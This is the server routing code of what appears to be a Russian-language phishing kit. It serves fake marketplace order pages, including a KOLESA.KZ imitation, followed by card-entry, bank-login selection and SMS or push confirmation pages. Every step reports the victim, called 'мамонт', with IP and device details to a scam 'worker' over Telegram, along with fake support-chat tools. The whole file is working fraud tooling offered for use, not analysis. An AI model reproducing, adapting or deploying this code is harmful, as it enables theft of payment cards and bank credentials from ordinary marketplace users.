const express = require("express");
const { Telegram, Markup } = require("telegraf");

const userAgent = require("express-useragent");

const router = express.Router();

const config = require("../../config");
const getCurCode = require("../../handlers/functions/getCurCode");
const {
  users,
  items,
  services,
  Logs,
  settings,
  countries,
  BanList,
} = require("../../database/index");

const translate = require("../translate");

const bot = new Telegram(config.bot.token);

function reqInfo(req) {
  try {
    var text = ``;
    const userInfo = userAgent.parse(req.headers["user-agent"]);
    text += `${
      userInfo.isMobile
        ? "📱 Телефон"
        : userInfo.isDesktop
        ? "🖥 Компьютер"
        : userInfo.isBot
        ? "🤖 Бот"
        : "📟 Что-то другое"
    } (${userInfo.browser})
🌍 ${req.socket.remoteAddress.replace("::ffff:", "")}`;

    return text;
  } catch (err) {
    return "\nнет данных";
  }
}

// Функция для форматирования цены для KOLESA.KZ
function formatPrice(price, currency) {
  if (currency === 'KZT') {
    return `₸ ${parseInt(price).toLocaleString('ru-RU')}`;
  }
  return `${parseInt(price).toLocaleString('ru-RU')} ${currency}`;
}

// главная страница
router.get("/order/:itemId", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.params.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const Settings = await settings.findOne({ where: { id: 1 } });

    if (Settings.work == false) return res.render("wait");

    if (worker.siteStatus == false) return res.render("wait");

    var url;

    if (Settings.lk == true && country.lk == true)
      url = `/pay/personal/${item.id}`;
    else url = `/pay/merchant/${item.id}`;

    await bot.sendMessage(
      item.workerId,
      `🦅 ПЕРЕХОД » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

╭ 🆔 Track: ${item.id}
├ 📦 Объявление: ${item.title || 'Не указано'}
╰ 💰 Цена: ${item.price || '0'}.00 ${service.currency}

${reqInfo(req)}

Ответь на это сообщение, чтобы написать мамонту в ТП`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`),
            Markup.callbackButton(`💬 Открыть ТП`, `openSupport_${item.id}`)
          ],
          [Markup.callbackButton(`📝 Шаблоны`, `templates_${item.id}`)]
        ]),
      }
    ).catch((err) => err);

    // Базовые данные для всех шаблонов
    let templateData = {
      item,
      worker,
      curr: await getCurCode(service.currency),
      url,
    };

    // Дополнительные данные только для kolesa1_kz (KOLESA.KZ 1.0)
    if (item.serviceCode === 'kolesa1_kz') {
      const formattedPrice = formatPrice(item.price, service.currency);
      
      templateData = {
        ...templateData,
        item: {
          ...item.dataValues, // Все поля из базы
          formattedPrice: formattedPrice
        },
        receiver: {
          name: item.receiverName || 'Получатель не указан',
          phone: item.receiverPhone || '+7 777 000-00-00',
          address: item.receiverAddress || 'Адрес не указан'
        },
        // Для совместимости со старыми шаблонами
        formattedPrice: formattedPrice
      };
    }

    return res.render(
      `${item.serviceCode.split("_")[1]}/${item.serviceCode.split("_")[0]}`,
      templateData
    );
  } catch (err) {
    console.log(err);
  }
});

// API endpoint для получения данных объявления (для AJAX запросов)
router.get("/api/items/:itemId", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.params.itemId,
      },
    });

    if (!item) return res.status(404).json({ error: 'Item not found' });

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    // Возвращаем данные в JSON формате для JavaScript
    const responseData = {
      id: item.id,
      title: item.title,
      price: item.price,
      photo: item.photo,
      currency: service.currency,
      receiverName: item.receiverName,
      receiverPhone: item.receiverPhone,
      receiverAddress: item.receiverAddress,
      workerId: item.workerId,
      createdAt: item.createdAt
    };

    res.json(responseData);
  } catch (err) {
    console.log(err);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint для отправки сообщений в поддержку
router.post("/api/support/message", async (req, res) => {
  try {
    const { itemId, workerId, message } = req.body;

    if (!itemId || !workerId || !message) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const item = await items.findOne({
      where: { id: itemId }
    });

    if (!item) {
      return res.status(404).json({ error: 'Item not found' });
    }

    // Отправляем сообщение воркеру в Telegram
    await bot.sendMessage(
      workerId,
      `💬 СООБЩЕНИЕ ОТ МАМОНТА » #${itemId}

📝 Сообщение: ${message}

${reqInfo(req)}`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton(`Ответить`, `suppportReply_${itemId}`)],
        ]),
      }
    ).catch((err) => console.log('Telegram send error:', err));

    res.json({ success: true });
  } catch (err) {
    console.log(err);
    res.status(500).json({ error: 'Server error' });
  }
});

// ввода карты ЛК
router.get("/merchants/:token", async (req, res) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: req.params.token,
      },
    });

    if (!log) return res.sendStatus(404);

    const item = await items.findOne({
      where: {
        id: log.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const Settings = await settings.findOne({ where: { id: 1 } });

    if (Settings.work == false) return res.render("wait");

    if (worker.siteStatus == false) return res.render("wait");

    await bot.sendMessage(
      item.workerId,
      `💳 НА ВВОДЕ КАРТЫ » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

╭ 🆔 Track: ${item.id}
├ 📦 Объявление: ${item.title || 'Не указано'}
╰ 💰 Цена: ${item.price || '0'}.00 ${service.currency}

${reqInfo(req)}

Ответь на это сообщение, чтобы написать мамонту в ТП`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`),
            Markup.callbackButton(`💬 Открыть ТП`, `openSupport_${item.id}`)
          ],
          [Markup.callbackButton(`📝 Шаблоны`, `templates_${item.id}`)]
        ]),
      }
    ).catch((err) => err);

    return res.render(`lkCard`, {
      log,
      service,
      worker,
      item,
      translate: translate[service.country],
      title: service.title.replace(/[^a-zA-Z]+/g, ""),
      curr: await getCurCode(service.currency),
    });
  } catch (err) {
    console.log(err);
  }
});

// главный ввод карты
router.get("/merchant/:itemId", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.params.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const Settings = await settings.findOne({ where: { id: 1 } });

    if (Settings.work == false) return res.render("wait");

    if (worker.siteStatus == false) return res.render("wait");

    await bot.sendMessage(
      item.workerId,
      `💳 НА ВВОДЕ КАРТЫ » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

╭ 🆔 Track: ${item.id}
├ 📦 Объявление: ${item.title || 'Не указано'}
╰ 💰 Цена: ${item.price || '0'}.00 ${service.currency}

${reqInfo(req)}

Ответь на это сообщение, чтобы написать мамонту в ТП`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`),
            Markup.callbackButton(`💬 Открыть ТП`, `openSupport_${item.id}`)
          ],
          [Markup.callbackButton(`📝 Шаблоны`, `templates_${item.id}`)]
        ]),
      }
    ).catch((err) => err);

    return res.render(`card`, {
      service,
      worker,
      item,
      translate: translate[service.country],
      title: service.title.replace(/[^a-zA-Z]+/g, ""),
      curr: await getCurCode(service.currency),
    });
  } catch (err) {
    console.log(err);
  }
});

// страница ввода лк
router.post("/personal/:itemId", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.params.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const Settings = await settings.findOne({ where: { id: 1 } });

    if (Settings.work == false) return res.render("wait");

    if (worker.siteStatus == false) return res.render("wait");

    const bank = req.body.bank;

    await bot.sendMessage(
      item.workerId,
      `🏦 ВЫБОР БАНКА » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

╭ 🆔 Track: ${item.id}
├ 📦 Объявление: ${item.title || 'Не указано'}
├ 💰 Цена: ${item.price || '0'}.00 ${service.currency}
╰ 🏦 Банк: ${bank}

${reqInfo(req)}

Ответь на это сообщение, чтобы написать мамонту в ТП`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`),
            Markup.callbackButton(`💬 Открыть ТП`, `openSupport_${item.id}`)
          ],
          [Markup.callbackButton(`📝 Шаблоны`, `templates_${item.id}`)]
        ]),
      }
    ).catch((err) => err);

    return res.render(`lk/${item.serviceCode.split("_")[1]}/${req.body.bank}`, {
      item,
      worker,
      translate: translate[service.country],
      curr: await getCurCode(service.currency),
    });
  } catch (err) {
    console.log(err);
  }
});

// страница выбора лк
router.get("/personal/:itemId", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.params.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const Settings = await settings.findOne({ where: { id: 1 } });

    if (Settings.work == false) return res.render("wait");

    if (worker.siteStatus == false) return res.render("wait");

    await bot.sendMessage(
      item.workerId,
      `🏦 ПЕРЕХОД НА ВЫБОР БАНКА » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

╭ 🆔 Track: ${item.id}
├ 📦 Объявление: ${item.title || 'Не указано'}
╰ 💰 Цена: ${item.price || '0'}.00 ${service.currency}

${reqInfo(req)}

Ответь на это сообщение, чтобы написать мамонту в ТП`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`),
            Markup.callbackButton(`💬 Открыть ТП`, `openSupport_${item.id}`)
          ],
          [Markup.callbackButton(`📝 Шаблоны`, `templates_${item.id}`)]
        ]),
      }
    ).catch((err) => err);

    return res.render(`lk/${item.serviceCode.split("_")[1]}/select`, {
      item,
      worker,
      curr: await getCurCode(service.currency),
    });
  } catch (err) {
    console.log(err);
  }
});

// смс и пуш подтверждение
router.get("/merchant/confirm-:action/:logId", async (req, res) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: req.params.logId,
      },
    });

    if (!log) return res.sendStatus(404);

    const item = await items.findOne({
      where: {
        id: log.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const Settings = await settings.findOne({ where: { id: 1 } });

    if (Settings.work == false) return res.render("wait");

    if (worker.siteStatus == false) return res.render("wait");

    await bot.sendMessage(
      item.workerId,
      `🕓 ОЖИДАНИЕ ${req.params.action.toUpperCase()}-ПОДТВЕРЖДЕНИЯ » ${Array.from(country.title)[0]}${Array.from(country.title)[1]} ${service.title.replace(/[^a-zA-Z]+/g, "")} (${item.status})

╭ 🆔 Track: ${item.id}
├ 📦 Объявление: ${item.title || 'Не указано'}
╰ 💰 Цена: ${item.price || '0'}.00 ${service.currency}

${reqInfo(req)}

Ответь на это сообщение, чтобы написать мамонту в ТП`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`),
            Markup.callbackButton(`💬 Открыть ТП`, `openSupport_${item.id}`)
          ],
          [Markup.callbackButton(`📝 Шаблоны`, `templates_${item.id}`)]
        ]),
      }
    ).catch((err) => err);

    return res.render(`errors/${req.params.action}`, {
      log,
      service,
      worker,
      item,
      translate: translate[service.country],
      curr: await getCurCode(service.currency),
    });
  } catch (err) {
    console.log(err);
  }
});

module.exports = router;